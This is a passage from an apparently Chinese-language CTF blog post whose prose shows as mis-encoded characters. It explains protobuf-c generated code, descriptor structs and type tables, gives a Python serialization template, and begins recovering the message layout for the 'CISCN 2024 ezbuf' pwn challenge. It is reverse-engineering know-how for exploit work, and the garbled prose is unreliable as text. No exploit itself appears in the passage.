</span></span></code></pre></div><p>&ndash;c_out=./ : å°†.protoæ–‡ä»¶ä»¥Cè¯­è¨€æ ¼å¼è¾“å‡ºåœ¨å½“å‰ç›®å½•ä¸‹</p><p>åˆ†æ.cæ–‡ä»¶</p><h3 id=åºåˆ—åŒ–å’Œååºåˆ—åŒ–å‡½æ•°>åºåˆ—åŒ–å’Œååºåˆ—åŒ–å‡½æ•°<a hidden class=anchor aria-hidden=true href=#åºåˆ—åŒ–å’Œååºåˆ—åŒ–å‡½æ•°>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>size_t</span> <span class=nf>devicemsg__pack</span> <span class=p>(</span><span class=k>const</span> <span class=n>Devicemsg</span> <span class=o>*</span><span class=n>message</span><span class=p>,</span> <span class=kt>uint8_t</span> <span class=o>*</span><span class=n>out</span><span class=p>)</span> <span class=c1>//åºåˆ—åŒ–
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nf>assert</span><span class=p>(</span><span class=n>message</span><span class=o>-&gt;</span><span class=n>base</span><span class=p>.</span><span class=n>descriptor</span> <span class=o>==</span> <span class=o>&amp;</span><span class=n>devicemsg__descriptor</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nf>protobuf_c_message_pack</span> <span class=p>((</span><span class=k>const</span> <span class=n>ProtobufCMessage</span><span class=o>*</span><span class=p>)</span><span class=n>message</span><span class=p>,</span> <span class=n>out</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>Devicemsg</span> <span class=o>*</span><span class=nf>devicemsg__unpack</span><span class=p>(</span><span class=n>ProtobufCAllocator</span>  <span class=o>*</span><span class=n>allocator</span><span class=p>,</span> <span class=kt>size_t</span> <span class=n>len</span><span class=p>,</span> <span class=k>const</span> <span class=kt>uint8_t</span> <span class=o>*</span><span class=n>data</span><span class=p>)</span> <span class=c1>// ååºåˆ—åŒ–
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=p>(</span><span class=n>Devicemsg</span> <span class=o>*</span><span class=p>)</span><span class=nf>protobuf_c_message_unpack</span><span class=p>(</span><span class=o>&amp;</span><span class=n>devicemsg__descriptor</span><span class=p>,</span><span class=n>allocator</span><span class=p>,</span> <span class=n>len</span><span class=p>,</span> <span class=n>data</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><h3 id=ç»“æ„ä½“ä¿¡æ¯>ç»“æ„ä½“ä¿¡æ¯<a hidden class=anchor aria-hidden=true href=#ç»“æ„ä½“ä¿¡æ¯>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>static</span> <span class=k>const</span> <span class=n>ProtobufCFieldDescriptor</span> <span class=n>devicemsg__field_descriptors</span><span class=p>[</span><span class=mi>5</span><span class=p>]</span> <span class=o>=</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;whatcon&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mi>1</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>PROTOBUF_C_LABEL_NONE</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>PROTOBUF_C_TYPE_BYTES</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mi>0</span><span class=p>,</span>   <span class=cm>/* quantifier_offset */</span>
</span></span><span class=line><span class=cl>    <span class=nf>offsetof</span><span class=p>(</span><span class=n>Devicemsg</span><span class=p>,</span> <span class=n>whatcon</span><span class=p>),</span>
</span></span><span class=line><span class=cl>    <span class=nb>NULL</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nb>NULL</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mi>0</span><span class=p>,</span>             <span class=cm>/* flags */</span>
</span></span><span class=line><span class=cl>    <span class=mi>0</span><span class=p>,</span><span class=nb>NULL</span><span class=p>,</span><span class=nb>NULL</span>    <span class=cm>/* reserved1,reserved2, etc */</span>
</span></span><span class=line><span class=cl>  <span class=p>},</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;whattodo&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mi>2</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>PROTOBUF_C_LABEL_NONE</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>PROTOBUF_C_TYPE_SINT64</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mi>0</span><span class=p>,</span>   <span class=cm>/* quantifier_offset */</span>
</span></span><span class=line><span class=cl>    <span class=nf>offsetof</span><span class=p>(</span><span class=n>Devicemsg</span><span class=p>,</span> <span class=n>whattodo</span><span class=p>),</span>
</span></span><span class=line><span class=cl>    <span class=nb>NULL</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nb>NULL</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mi>0</span><span class=p>,</span>             <span class=cm>/* flags */</span>
</span></span><span class=line><span class=cl>    <span class=mi>0</span><span class=p>,</span><span class=nb>NULL</span><span class=p>,</span><span class=nb>NULL</span>    <span class=cm>/* reserved1,reserved2, etc */</span>
</span></span><span class=line><span class=cl>  <span class=p>},</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;whatidx&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mi>3</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>PROTOBUF_C_LABEL_NONE</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>PROTOBUF_C_TYPE_SINT64</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mi>0</span><span class=p>,</span>   <span class=cm>/* quantifier_offset */</span>
</span></span><span class=line><span class=cl>    <span class=nf>offsetof</span><span class=p>(</span><span class=n>Devicemsg</span><span class=p>,</span> <span class=n>whatidx</span><span class=p>),</span>
</span></span><span class=line><span class=cl>    <span class=nb>NULL</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nb>NULL</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mi>0</span><span class=p>,</span>             <span class=cm>/* flags */</span>
</span></span><span class=line><span class=cl>    <span class=mi>0</span><span class=p>,</span><span class=nb>NULL</span><span class=p>,</span><span class=nb>NULL</span>    <span class=cm>/* reserved1,reserved2, etc */</span>
</span></span><span class=line><span class=cl>  <span class=p>},</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;whatsize&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mi>4</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>PROTOBUF_C_LABEL_NONE</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>PROTOBUF_C_TYPE_SINT64</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mi>0</span><span class=p>,</span>   <span class=cm>/* quantifier_offset */</span>
</span></span><span class=line><span class=cl>    <span class=nf>offsetof</span><span class=p>(</span><span class=n>Devicemsg</span><span class=p>,</span> <span class=n>whatsize</span><span class=p>),</span>
</span></span><span class=line><span class=cl>    <span class=nb>NULL</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nb>NULL</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mi>0</span><span class=p>,</span>             <span class=cm>/* flags */</span>
</span></span><span class=line><span class=cl>    <span class=mi>0</span><span class=p>,</span><span class=nb>NULL</span><span class=p>,</span><span class=nb>NULL</span>    <span class=cm>/* reserved1,reserved2, etc */</span>
</span></span><span class=line><span class=cl>  <span class=p>},</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;whatsthis&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mi>5</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>PROTOBUF_C_LABEL_NONE</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>PROTOBUF_C_TYPE_UINT32</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mi>0</span><span class=p>,</span>   <span class=cm>/* quantifier_offset */</span>
</span></span><span class=line><span class=cl>    <span class=nf>offsetof</span><span class=p>(</span><span class=n>Devicemsg</span><span class=p>,</span> <span class=n>whatsthis</span><span class=p>),</span>
</span></span><span class=line><span class=cl>    <span class=nb>NULL</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nb>NULL</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mi>0</span><span class=p>,</span>             <span class=cm>/* flags */</span>
</span></span><span class=line><span class=cl>    <span class=mi>0</span><span class=p>,</span><span class=nb>NULL</span><span class=p>,</span><span class=nb>NULL</span>    <span class=cm>/* reserved1,reserved2, etc */</span>
</span></span><span class=line><span class=cl>  <span class=p>},</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=k>const</span> <span class=kt>unsigned</span> <span class=n>devicemsg__field_indices_by_name</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=mi>0</span><span class=p>,</span>   <span class=cm>/* field[0] = whatcon */</span>
</span></span><span class=line><span class=cl>  <span class=mi>2</span><span class=p>,</span>   <span class=cm>/* field[2] = whatidx */</span>
</span></span><span class=line><span class=cl>  <span class=mi>3</span><span class=p>,</span>   <span class=cm>/* field[3] = whatsize */</span>
</span></span><span class=line><span class=cl>  <span class=mi>4</span><span class=p>,</span>   <span class=cm>/* field[4] = whatsthis */</span>
</span></span><span class=line><span class=cl>  <span class=mi>1</span><span class=p>,</span>   <span class=cm>/* field[1] = whattodo */</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=k>const</span> <span class=n>ProtobufCIntRange</span> <span class=n>devicemsg__number_ranges</span><span class=p>[</span><span class=mi>1</span> <span class=o>+</span> <span class=mi>1</span><span class=p>]</span> <span class=o>=</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>0</span> <span class=p>},</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>5</span> <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl><span class=k>const</span> <span class=n>ProtobufCMessageDescriptor</span> <span class=n>devicemsg__descriptor</span> <span class=o>=</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>PROTOBUF_C__MESSAGE_DESCRIPTOR_MAGIC</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=s>&#34;devicemsg&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=s>&#34;Devicemsg&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=s>&#34;Devicemsg&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=s>&#34;&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=k>sizeof</span><span class=p>(</span><span class=n>Devicemsg</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=mi>5</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=n>devicemsg__field_descriptors</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=n>devicemsg__field_indices_by_name</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>1</span><span class=p>,</span>  <span class=n>devicemsg__number_ranges</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=p>(</span><span class=n>ProtobufCMessageInit</span><span class=p>)</span> <span class=n>devicemsg__init</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nb>NULL</span><span class=p>,</span><span class=nb>NULL</span><span class=p>,</span><span class=nb>NULL</span>    <span class=cm>/* reserved[123] */</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span></code></pre></div><p>å¯ä»¥çœ‹åˆ°æ¯ä¸€ä¸ªç»“æ„ä½“ä¸­ï¼Œå­—æ®µä¿¡æ¯åˆ†åˆ«æ˜¯æˆå‘˜åç§°ï¼Œåºå·ç´¢å¼•ï¼Œæ ‡ç­¾ï¼Œæ•°æ®ç±»å‹ï¼Œé™å®šç¬¦å­—æ®µåç§»ï¼ˆä¿ºä¹Ÿæ²¡å¼„æ‡‚ï¼Œåç§»é‡ï¼ˆå’Œç»“æ„ä½“é¦–åœ°å€çš„ï¼‰&mldr;</p><h3 id=ç±»å‹è¡¨>ç±»å‹è¡¨<a hidden class=anchor aria-hidden=true href=#ç±»å‹è¡¨>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>typedef</span> <span class=k>enum</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=n>PROTOBUF_C_TYPE_INT32</span><span class=p>,</span>      <span class=cm>/**&lt; int32 */</span>
</span></span><span class=line><span class=cl>	<span class=n>PROTOBUF_C_TYPE_SINT32</span><span class=p>,</span>     <span class=cm>/**&lt; signed int32 */</span>
</span></span><span class=line><span class=cl>	<span class=n>PROTOBUF_C_TYPE_SFIXED32</span><span class=p>,</span>   <span class=cm>/**&lt; signed int32 (4 bytes) */</span>
</span></span><span class=line><span class=cl>	<span class=n>PROTOBUF_C_TYPE_INT64</span><span class=p>,</span>      <span class=cm>/**&lt; int64 */</span>
</span></span><span class=line><span class=cl>	<span class=n>PROTOBUF_C_TYPE_SINT64</span><span class=p>,</span>     <span class=cm>/**&lt; signed int64 */</span>
</span></span><span class=line><span class=cl>	<span class=n>PROTOBUF_C_TYPE_SFIXED64</span><span class=p>,</span>   <span class=cm>/**&lt; signed int64 (8 bytes) */</span>
</span></span><span class=line><span class=cl>	<span class=n>PROTOBUF_C_TYPE_UINT32</span><span class=p>,</span>     <span class=cm>/**&lt; unsigned int32 */</span>
</span></span><span class=line><span class=cl>	<span class=n>PROTOBUF_C_TYPE_FIXED32</span><span class=p>,</span>    <span class=cm>/**&lt; unsigned int32 (4 bytes) */</span>
</span></span><span class=line><span class=cl>	<span class=n>PROTOBUF_C_TYPE_UINT64</span><span class=p>,</span>     <span class=cm>/**&lt; unsigned int64 */</span>
</span></span><span class=line><span class=cl>	<span class=n>PROTOBUF_C_TYPE_FIXED64</span><span class=p>,</span>    <span class=cm>/**&lt; unsigned int64 (8 bytes) */</span>
</span></span><span class=line><span class=cl>	<span class=n>PROTOBUF_C_TYPE_FLOAT</span><span class=p>,</span>      <span class=cm>/**&lt; float */</span>
</span></span><span class=line><span class=cl>	<span class=n>PROTOBUF_C_TYPE_DOUBLE</span><span class=p>,</span>     <span class=cm>/**&lt; double */</span>
</span></span><span class=line><span class=cl>	<span class=n>PROTOBUF_C_TYPE_BOOL</span><span class=p>,</span>       <span class=cm>/**&lt; boolean */</span>
</span></span><span class=line><span class=cl>	<span class=n>PROTOBUF_C_TYPE_ENUM</span><span class=p>,</span>       <span class=cm>/**&lt; enumerated type */</span>
</span></span><span class=line><span class=cl>	<span class=n>PROTOBUF_C_TYPE_STRING</span><span class=p>,</span>     <span class=cm>/**&lt; UTF-8 or ASCII string */</span>
</span></span><span class=line><span class=cl>	<span class=n>PROTOBUF_C_TYPE_BYTES</span><span class=p>,</span>      <span class=cm>/**&lt; arbitrary byte sequence */</span>
</span></span><span class=line><span class=cl>	<span class=n>PROTOBUF_C_TYPE_MESSAGE</span><span class=p>,</span>    <span class=cm>/**&lt; nested message */</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=n>ProtobufCType</span><span class=p>;</span>
</span></span></code></pre></div><p>ä»0åˆ°0x10</p><h3 id=æè¿°ç¬¦ç»“æ„ä½“>æè¿°ç¬¦ç»“æ„ä½“<a hidden class=anchor aria-hidden=true href=#æè¿°ç¬¦ç»“æ„ä½“>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cm>/**
</span></span></span><span class=line><span class=cl><span class=cm> * Describes a message.
</span></span></span><span class=line><span class=cl><span class=cm> */</span>
</span></span><span class=line><span class=cl><span class=k>struct</span> <span class=n>ProtobufCMessageDescriptor</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=cm>/** Magic value checked to ensure that the API is used correctly. */</span>
</span></span><span class=line><span class=cl>	<span class=kt>uint32_t</span>			<span class=n>magic</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=cm>/** The qualified name (e.g., &#34;namespace.Type&#34;). */</span>
</span></span><span class=line><span class=cl>	<span class=k>const</span> <span class=kt>char</span>			<span class=o>*</span><span class=n>name</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=cm>/** The unqualified name as given in the .proto file (e.g., &#34;Type&#34;). */</span>
</span></span><span class=line><span class=cl>	<span class=k>const</span> <span class=kt>char</span>			<span class=o>*</span><span class=n>short_name</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=cm>/** Identifier used in generated C code. */</span>
</span></span><span class=line><span class=cl>	<span class=k>const</span> <span class=kt>char</span>			<span class=o>*</span><span class=n>c_name</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=cm>/** The dot-separated namespace. */</span>
</span></span><span class=line><span class=cl>	<span class=k>const</span> <span class=kt>char</span>			<span class=o>*</span><span class=n>package_name</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=cm>/**
</span></span></span><span class=line><span class=cl><span class=cm>	 * Size in bytes of the C structure representing an instance of this
</span></span></span><span class=line><span class=cl><span class=cm>	 * type of message.
</span></span></span><span class=line><span class=cl><span class=cm>	 */</span>
</span></span><span class=line><span class=cl>	<span class=kt>size_t</span>				<span class=n>sizeof_message</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=cm>/** Number of elements in `fields`. */</span>
</span></span><span class=line><span class=cl>	<span class=kt>unsigned</span>			<span class=n>n_fields</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=cm>/** Field descriptors, sorted by tag number. */</span>
</span></span><span class=line><span class=cl>	<span class=k>const</span> <span class=n>ProtobufCFieldDescriptor</span>	<span class=o>*</span><span class=n>fields</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=cm>/** Used for looking up fields by name. */</span>
</span></span><span class=line><span class=cl>	<span class=k>const</span> <span class=kt>unsigned</span>			<span class=o>*</span><span class=n>fields_sorted_by_name</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=cm>/** Number of elements in `field_ranges`. */</span>
</span></span><span class=line><span class=cl>	<span class=kt>unsigned</span>			<span class=n>n_field_ranges</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=cm>/** Used for looking up fields by id. */</span>
</span></span><span class=line><span class=cl>	<span class=k>const</span> <span class=n>ProtobufCIntRange</span>		<span class=o>*</span><span class=n>field_ranges</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=cm>/** Message initialisation function. */</span>
</span></span><span class=line><span class=cl>	<span class=n>ProtobufCMessageInit</span>		<span class=n>message_init</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=cm>/** Reserved for future use. */</span>
</span></span><span class=line><span class=cl>	<span class=kt>void</span>				<span class=o>*</span><span class=n>reserved1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=cm>/** Reserved for future use. */</span>
</span></span><span class=line><span class=cl>	<span class=kt>void</span>				<span class=o>*</span><span class=n>reserved2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=cm>/** Reserved for future use. */</span>
</span></span><span class=line><span class=cl>	<span class=kt>void</span>				<span class=o>*</span><span class=n>reserved3</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span></code></pre></div><p>important:</p><ol><li>magicï¼Œä¸€èˆ¬ä¸º0x28AAEEF9</li><li>n_fieldsï¼Œå…³ç³»åˆ°åŸå§‹çš„messageç»“æ„å†…æœ‰å‡ æ¡è®°å½•ã€</li><li>fieldsï¼Œè¿™ä¸ªæŒ‡å‘messageå†…æ‰€æœ‰è®°å½•ç±»å‹ç»„æˆçš„ä¸€ä¸ªæ•°ç»„ï¼Œå¯ä»¥å€Ÿæ­¤é€†å‘åˆ†æmessageç»“æ„ã€‚</li></ol><h3 id=fieldç»“æ„ä½“>fieldç»“æ„ä½“<a hidden class=anchor aria-hidden=true href=#fieldç»“æ„ä½“>#</a></h3><p>è¿™ä¸ªç»“æ„ä½“å°±æ˜¯ä¸Šæ–‡è¯´çš„å‚¨å­˜åç§°ï¼Œåç§»é‡çš„ï¼Œä¹Ÿæ˜¯IDAé‡Œé¢çœ‹åˆ°çš„</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>struct</span> <span class=n>ProtobufCFieldDescriptor</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=cm>/** Name of the field as given in the .proto file. */</span>
</span></span><span class=line><span class=cl>	<span class=k>const</span> <span class=kt>char</span>		<span class=o>*</span><span class=n>name</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=cm>/** Tag value of the field as given in the .proto file. */</span>
</span></span><span class=line><span class=cl>	<span class=kt>uint32_t</span>		<span class=n>id</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=cm>/** Whether the field is `REQUIRED`, `OPTIONAL`, or `REPEATED`. */</span>
</span></span><span class=line><span class=cl>	<span class=n>ProtobufCLabel</span>		<span class=n>label</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=cm>/** The type of the field. */</span>
</span></span><span class=line><span class=cl>	<span class=n>ProtobufCType</span>		<span class=n>type</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=cm>/**
</span></span></span><span class=line><span class=cl><span class=cm>	 * The offset in bytes of the message&#39;s C structure&#39;s quantifier field
</span></span></span><span class=line><span class=cl><span class=cm>	 * (the `has_MEMBER` field for optional members or the `n_MEMBER` field
</span></span></span><span class=line><span class=cl><span class=cm>	 * for repeated members or the case enum for oneofs).
</span></span></span><span class=line><span class=cl><span class=cm>	 */</span>
</span></span><span class=line><span class=cl>	<span class=kt>unsigned</span>		<span class=n>quantifier_offset</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=cm>/**
</span></span></span><span class=line><span class=cl><span class=cm>	 * The offset in bytes into the message&#39;s C structure for the member
</span></span></span><span class=line><span class=cl><span class=cm>	 * itself.
</span></span></span><span class=line><span class=cl><span class=cm>	 */</span>
</span></span><span class=line><span class=cl>	<span class=kt>unsigned</span>		<span class=n>offset</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=cm>/**
</span></span></span><span class=line><span class=cl><span class=cm>	 * A type-specific descriptor.
</span></span></span><span class=line><span class=cl><span class=cm>	 *
</span></span></span><span class=line><span class=cl><span class=cm>	 * If `type` is `PROTOBUF_C_TYPE_ENUM`, then `descriptor` points to the
</span></span></span><span class=line><span class=cl><span class=cm>	 * corresponding `ProtobufCEnumDescriptor`.
</span></span></span><span class=line><span class=cl><span class=cm>	 *
</span></span></span><span class=line><span class=cl><span class=cm>	 * If `type` is `PROTOBUF_C_TYPE_MESSAGE`, then `descriptor` points to
</span></span></span><span class=line><span class=cl><span class=cm>	 * the corresponding `ProtobufCMessageDescriptor`.
</span></span></span><span class=line><span class=cl><span class=cm>	 *
</span></span></span><span class=line><span class=cl><span class=cm>	 * Otherwise this field is NULL.
</span></span></span><span class=line><span class=cl><span class=cm>	 */</span>
</span></span><span class=line><span class=cl>	<span class=k>const</span> <span class=kt>void</span>		<span class=o>*</span><span class=n>descriptor</span><span class=p>;</span> <span class=cm>/* for MESSAGE and ENUM types */</span>
</span></span><span class=line><span class=cl>	<span class=cm>/** The default value for this field, if defined. May be NULL. */</span>
</span></span><span class=line><span class=cl>	<span class=k>const</span> <span class=kt>void</span>		<span class=o>*</span><span class=n>default_value</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=cm>/**
</span></span></span><span class=line><span class=cl><span class=cm>	 * A flag word. Zero or more of the bits defined in the
</span></span></span><span class=line><span class=cl><span class=cm>	 * `ProtobufCFieldFlag` enum may be set.
</span></span></span><span class=line><span class=cl><span class=cm>	 */</span>
</span></span><span class=line><span class=cl>	<span class=kt>uint32_t</span>		<span class=n>flags</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=cm>/** Reserved for future use. */</span>
</span></span><span class=line><span class=cl>	<span class=kt>unsigned</span>		<span class=n>reserved_flags</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=cm>/** Reserved for future use. */</span>
</span></span><span class=line><span class=cl>	<span class=kt>void</span>			<span class=o>*</span><span class=n>reserved2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=cm>/** Reserved for future use. */</span>
</span></span><span class=line><span class=cl>	<span class=kt>void</span>			<span class=o>*</span><span class=n>reserved3</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span></code></pre></div><p>å…·ä½“ä¿¡æ¯å¯çœ‹<a href=https://protobuf-c.github.io/protobuf-c/structProtobufCFieldDescriptor.html>protobuf-c</a></p><h2 id=use-protobuf-with-python>Use protobuf with python<a hidden class=anchor aria-hidden=true href=#use-protobuf-with-python>#</a></h2><p>è¾“å…¥å‘½ä»¤</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>protoc --python_out<span class=o>=</span>./ devicemsg.proto
</span></span></code></pre></div><p>ç”Ÿæˆ<code>devicemsg_pb2.py</code></p><h3 id=æ¨¡æ¿>æ¨¡æ¿<a hidden class=anchor aria-hidden=true href=#æ¨¡æ¿>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>devicemsg_pb2</span>
</span></span><span class=line><span class=cl><span class=n>data</span> <span class=o>=</span> <span class=n>devicemsg_pb2</span><span class=o>.</span><span class=n>devicemsg</span><span class=p>()</span> <span class=c1># æ–¹æ³•åç§°è·Ÿéš.protoä¸­ç»“æ„ä½“åç§°å˜åŒ–</span>
</span></span><span class=line><span class=cl><span class=n>data</span><span class=o>.</span><span class=n>whattodo</span> <span class=o>=</span> <span class=n>todo</span>
</span></span><span class=line><span class=cl><span class=n>data</span><span class=o>.</span><span class=n>whatcon</span> <span class=o>=</span> <span class=n>content</span>
</span></span><span class=line><span class=cl><span class=n>data</span><span class=o>.</span><span class=n>whatidx</span> <span class=o>=</span> <span class=n>idx</span>
</span></span><span class=line><span class=cl><span class=n>data</span><span class=o>.</span><span class=n>whatsize</span> <span class=o>=</span> <span class=n>size</span>
</span></span><span class=line><span class=cl><span class=n>data</span><span class=o>.</span><span class=n>whatsthis</span> <span class=o>=</span> <span class=n>this</span>
</span></span><span class=line><span class=cl><span class=n>data</span><span class=o>.</span><span class=n>SerializeToString</span><span class=p>()</span> <span class=c1># è½¬æ¢æˆbytes</span>
</span></span></code></pre></div><h2 id=ciscn-2024-ezbuf>CISCN 2024 ezbuf<a hidden class=anchor aria-hidden=true href=#ciscn-2024-ezbuf>#</a></h2><p>ğŸ‘¨åšè¿™é¢˜çš„æ—¶å€™ç”šè‡³ä¸çŸ¥é“protobufæ˜¯ä»€ä¹ˆ</p><h3 id=æ¢å¤ç»“æ„ä½“>æ¢å¤ç»“æ„ä½“<a hidden class=anchor aria-hidden=true href=#æ¢å¤ç»“æ„ä½“>#</a></h3><p><img loading=lazy src=1.png alt=image></p><p>å…³é”®ç»“æ„ä½“åœ¨è¿™ï¼Œ1ä»£è¡¨åºå·1ï¼Œ3ä»£è¡¨labelï¼Œ0XFä»£è¡¨ç±»å‹ï¼ŒæŸ¥è¡¨å³å¯</p><p>æ ¹æ®ä»¥ä¸Šå­—æ®µæ¢å¤å‡ºprotobufç»“æ„ä½“</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>syntax</span><span class=o>=</span><span class=s>&#34;proto3&#34;</span><span class=p>;</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>message</span> <span class=n>devicemsg</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>bytes</span> <span class=n>whatcon</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>sint64</span> <span class=n>whattodo</span> <span class=o>=</span> <span class=mi>2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>sint64</span> <span class=n>whatidx</span> <span class=o>=</span> <span class=mi>3</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>sint64</span> <span class=n>whatsize</span> <span class=o>=</span> <span class=mi>4</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>uint32</span> <span class=n>whatsthis</span> <span class=o>=</span> <span class=mi>5</span><span class=p>;</span>
